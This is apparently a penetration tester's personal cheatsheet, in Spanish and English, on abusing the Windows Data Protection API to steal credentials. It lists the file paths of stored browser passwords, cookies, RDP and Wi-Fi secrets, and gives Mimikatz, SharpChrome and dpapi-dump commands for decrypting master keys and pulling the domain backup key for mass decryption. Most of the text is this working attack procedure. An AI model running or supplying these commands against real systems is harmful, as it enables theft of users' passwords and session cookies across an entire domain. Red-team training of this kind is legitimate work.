---
aliases:
  - "KeePass Memory Dump"
  - "keepass"
  - "Memory Dump"
  - DPAPI
tags:
  - asset/active-directory
  - technique/credential-access
  - env/windows
kind: Technique
linked:
  - "[[Mimikatz Cheatsheet]]"
  - "[[LSASS Dumping]]"
---
# DPAPI Abuse

> [!info]
> **Data Protection API** — Windows API que cifra secrets (browser passwords, RDP creds, Chrome cookies, vaults). Cada user tiene su master key derivado de su password. Decryption requiere: master key o domain backup key.

***

## Targets típicos

| Target | Path |
|---|---|
| **Chrome passwords** | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |
| **Chrome cookies** | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies` |
| **Edge** | Idem Chrome pero en `Edge\` |
| **Firefox** | `%APPDATA%\Mozilla\Firefox\Profiles\*\logins.json` (key4.db) |
| **Outlook** | `%APPDATA%\Microsoft\Outlook\*.OST` |
| **RDP saved creds** | `%APPDATA%\Microsoft\Credentials\` |
| **Windows Credential Manager** | `%LOCALAPPDATA%\Microsoft\Credentials\` |
| **Wi-Fi profiles** | `%PROGRAMDATA%\Microsoft\Wlansvc\Profiles\Interfaces\*\` |
| **VaultCli (BrowserBased)** | `%LOCALAPPDATA%\Microsoft\Vault\` |

***

## Master Keys

```
%APPDATA%\Microsoft\Protect\<SID>\<MK-GUID>
```

Cifradas con SHA1(user password) + salt. Decryption requiere:
1. **Plaintext password** del user, O
2. **NTLM hash** (parcial — solo para current user), O
3. **Domain DPAPI backup key** (master en DC, decrypta TODOS los DPAPI del dominio).

***

## Workflow

### Local user
```bash
# Mimikatz local (current user)
dpapi::masterkey /in:"%APPDATA%\Microsoft\Protect\<SID>\<MK>" /password:<user-password>
# → obtiene master key plaintext

# Decrypt blob (Chrome login data, etc.)
dpapi::blob /masterkey:<mk-plaintext> /in:<file>
```

### Domain backup key (mass decrypt)
```bash
# DCSync to get domain DPAPI backup key
lsadump::backupkeys /system:<DC> /export

# Decrypt MK con backup key
dpapi::masterkey /in:<MK-file> /pvk:<backup-key.pvk>

# Mass: dpapi-dump
dpapi-dump.py -pvk <backup-key.pvk> ...
```

### Chrome cookies decrypt
```bash
SharpChrome.exe cookies /unprotect
```

***

## Tools

- **mimikatz**: `dpapi::*` modules
- **SharpDPAPI**: C# offensive DPAPI toolkit
- **SharpChrome**: Chrome-specific
- **dpapick**: Python offline parser
- **impacket-dpapi.py**

***

## Notas Relacionadas

- [[Mimikatz Cheatsheet]]
- [[LSASS Dumping]]
- [[DCSync]]
- [[Secret Dumping]]
